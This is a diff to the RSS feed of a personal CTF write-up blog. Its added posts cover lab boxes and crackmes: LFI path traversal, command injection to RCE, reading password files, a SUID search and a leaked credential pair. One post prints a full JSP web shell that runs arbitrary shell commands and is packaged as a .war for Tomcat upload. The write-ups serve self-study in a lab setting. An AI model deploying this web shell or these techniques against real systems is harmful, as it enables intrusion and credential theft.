@@ -6,7 +6,176 @@
     <description>Recent content on Cyber Blog-ul lui Novac</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ro-ro</language>
-    <lastBuildDate>Tue, 28 Apr 2026 10:56:47 +0000</lastBuildDate><atom:link href="https://novaclearnscyber.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 20 Jul 2026 09:20:03 +0000</lastBuildDate><atom:link href="https://novaclearnscyber.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ReversingElf</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/reversing-elf/</link>
+      <pubDate>Mon, 20 Jul 2026 09:20:03 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/reversing-elf/</guid>
+      
+      <description>&lt;p&gt;This will be my first indo binary exploatation&lt;br&gt;
+lets begin&lt;/p&gt;
+&lt;h3 id=&#34;crackme1&#34;&gt;Crackme1&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120000.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+just add the exec permision and run the file&lt;/p&gt;
+&lt;h3 id=&#34;crackme2&#34;&gt;Crackme2&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120609.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+when we try to run the program they ask for a password , intesting&lt;br&gt;
+lets run Strings to see the human readeble caracthers&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120507.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+ok cool we got the password being &amp;ldquo;super_secret_password&amp;rdquo;&lt;br&gt;
+now lets just run with the password&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120654.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;h3 id=&#34;crackme3&#34;&gt;Crackme3&lt;/h3&gt;
+&lt;p&gt;in the description it says to use some basic reverse enginering method , so i opened ghridra and looked into it&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131122621.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131123909.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+the two pictures frm above some very interesintg strings encoded in non other than base64 , lets copy them and decode them&lt;br&gt;
+and decoding the second liine we get the flag&lt;br&gt;
+**&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131124029.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>ultratech</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/ultratech/</link>
+      <pubDate>Mon, 20 Jul 2026 09:15:34 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/ultratech/</guid>
+      
+      <description>&lt;p&gt;scaning:&lt;br&gt;
+this nmap scan gives us all we need for the first page &lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303084750.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303084834.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;so the first page is done .&lt;br&gt;
+i also runned a feq gobuster scans and found a few interesting domains ,&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303144740.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303144808.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+one of them being /js which quiet interesting  , and inside it the api.js file , what grabbed my attention was ping line&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303094618.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;robots.txt gives a map&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303091608.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;trying some parameter checking here&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303092052.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;here i just tried a few random things like acces that note.js port and using the ping ip parameter we saw in that file earlier i was eable to get RCE&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303095427.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+i tried to do some reverse shell script but it didnt worked&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303102305.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+so i just listed the password file&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303103444.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+inside it i found 2 passwords hashes and both of them where on crackstation&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>manager-tomcat</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/manager-tomcat/</link>
+      <pubDate>Sun, 10 May 2026 10:52:51 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/manager-tomcat/</guid>
+      
+      <description>&lt;p&gt;access the site first time:&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260510064219.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+look at the image source&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260510064234.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+looks like LFI , do some path traversal in burp and get the pass of user tomcat&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260510060750.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+log in with the password at /manager&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260510065249.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+inside we get a file upload menu , the file need to be in .war format&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;create shell :
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
+nano shell.jsp
+
+COPY-PSTE THIS
+
+&amp;lt;%@ page import=&amp;#34;java.io.*&amp;#34; %&amp;gt;
+&amp;lt;%
+    String cmd = request.getParameter(&amp;#34;cmd&amp;#34;);
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(new String[]{&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, cmd});
+        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            out.println(line + &amp;#34;&amp;lt;br&amp;gt;&amp;#34;);
+        }
+    }
+%&amp;gt;
+
+SAVE EXIT 
+
+zip exploit.war shell.jsp A
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;now upload exploit.war and access YOUR-SITE/exploit/shell.jsp?cmd=/flag&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260510064024.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>boiler ctf</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/boiler-ctf/</link>
+      <pubDate>Mon, 04 May 2026 05:41:58 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/boiler-ctf/</guid>
+      
+      <description>&lt;p&gt;first enumeration&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260430053704.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+ftp server with anonymous login , a single file on it&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260430053737.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+excrypted in rot 13&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260430053756.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+nothin interesting&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260430053827.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+basic ubuntu web-server on&lt;/p&gt;
+&lt;p&gt;longer port enum&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260430055538.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260430054726.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;joomla , bruteforcce the logni&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260430062830.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$gobuster dir -u$IP/joomla/ -w /usr/share/wordlists/dirb/common.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;runned another gobuster on &amp;hellip;. , and we find an intersting budomain named _test&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260504010628.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260504011121.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260504011314.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;basterd superduper@$$&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260504011507.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260504011743.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ find / -perm /4000 -type f -exec ls -ld {} ; 2&amp;gt;/dev/null&lt;/p&gt;</description>
+      
+    </item>
+    
     <item>
       <title>Bounty Hacker</title>
       <link>https://novaclearnscyber.github.io/blog/posts/bounty-hacker/</link>
@@ -91,18 +260,6 @@ some random passwords&lt;br&gt;
 &lt;br&gt;
 looking aroung the site we found a page for ads , where we can inject diferent scripts , cool , so lets try to make a reverse shell with this.&lt;br&gt;
 &lt;a href=&#34;https://github.com/pentestmonkey/php-reverse-shell&#34;&gt;https://github.com/pentestmonkey/php-reverse-shell&lt;/a&gt; , used this shell from monkey pentest, modify your port and ip inside the script.&lt;/p&gt;</description>
-      
-    </item>
-    
-    <item>
-      <title>Team</title>
-      <link>https://novaclearnscyber.github.io/blog/posts/team/</link>
-      <pubDate>Fri, 24 Apr 2026 08:55:50 +0000</pubDate>
-      <guid>https://novaclearnscyber.github.io/blog/posts/team/</guid>
-      
-      <description>&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260424045506.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-basic recon basic ports opened nothing interesting , we get the Apache version which could be useful&lt;/p&gt;</description>
       
     </item>
     
@@ -316,45 +473,6 @@ if we input the two addresses from the api dashboard into admin settings we get 
  &lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260306063210.png&#34; alt=&#34;&#34;&gt;
 &lt;br&gt;
 when we decode those using cyber chef we get the following (for getAllAdmins):&lt;/p&gt;</description>
-      
-    </item>
-    
-    <item>
-      <title>ultratech</title>
-      <link>https://novaclearnscyber.github.io/blog/posts/ultratech/</link>
-      <pubDate>Tue, 03 Mar 2026 19:56:51 +0000</pubDate>
-      <guid>https://novaclearnscyber.github.io/blog/posts/ultratech/</guid>
-      
-      <description>&lt;p&gt;scaning:&lt;br&gt;
-this nmap scan gives us all we need for the first page &lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303084750.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303084834.png&#34; alt=&#34;&#34;&gt;
-&lt;/p&gt;
-&lt;p&gt;so the first page is done .&lt;br&gt;
-i also runned a feq gobuster scans and found a few interesting domains ,&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303144740.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303144808.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-one of them being /js which quiet interesting  , and inside it the api.js file , what grabbed my attention was ping line&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303094618.png&#34; alt=&#34;&#34;&gt;
-&lt;/p&gt;
-&lt;p&gt;robots.txt gives a map&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303091608.png&#34; alt=&#34;&#34;&gt;
-&lt;/p&gt;
-&lt;p&gt;trying some parameter checking here&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303092052.png&#34; alt=&#34;&#34;&gt;
-&lt;/p&gt;
-&lt;p&gt;here i just tried a few random things like acces that note.js port and using the ping ip parameter we saw in that file earlier i was eable to get RCE&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303095427.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-i tried to do some reverse shell script but it didnt worked&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303102305.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-so i just lister the password file&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260303103444.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-inside it i found 2 passwords hasheh and both of them where on crackstatio&lt;/p&gt;</description>
       
     </item>
     
@@ -819,42 +937,6 @@ i decided to inspect the page and founded this not shown&lt;br&gt;
 &lt;br&gt;
 looks like a password for ssh lets try it&lt;br&gt;
 alice:HowDothTheLittleCrocodileImproveHisShiningTail&lt;/p&gt;</description>
-      
-    </item>
-    
-    <item>
-      <title>ReversingElf</title>
-      <link>https://novaclearnscyber.github.io/blog/posts/reversing-elf/</link>
-      <pubDate>Sun, 01 Feb 2026 13:13:09 +0000</pubDate>
-      <guid>https://novaclearnscyber.github.io/blog/posts/reversing-elf/</guid>
-      
-      <description>&lt;p&gt;This will be my first indo binary exploatation&lt;br&gt;
-lets begin&lt;/p&gt;
-&lt;h3 id=&#34;crackme1&#34;&gt;Crackme1&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120000.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-just add the exec permision and run the file&lt;/p&gt;
-&lt;h3 id=&#34;crackme2&#34;&gt;Crackme2&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120609.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-when we try to run the program they ask for a password , intesting&lt;br&gt;
-lets run Strings to see the human readeble caracthers&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120507.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-ok cool we got the password being &amp;ldquo;super_secret_password&amp;rdquo;&lt;br&gt;
-now lets just run with the password&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131120654.png&#34; alt=&#34;&#34;&gt;
-&lt;/p&gt;
-&lt;h3 id=&#34;crackme3&#34;&gt;Crackme3&lt;/h3&gt;
-&lt;p&gt;in the description it says to use some basic reverse enginering method , so i opened ghridra and looked into it&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131122621.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131123909.png&#34; alt=&#34;&#34;&gt;
-&lt;br&gt;
-the two pictures frm above some very interesintg strings encoded in non other than base64 , lets copy them and decode them&lt;br&gt;
-and decoding the second liine we get the flag&lt;br&gt;
-**&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260131124029.png&#34; alt=&#34;&#34;&gt;
-&lt;/p&gt;</description>
       
     </item>
     
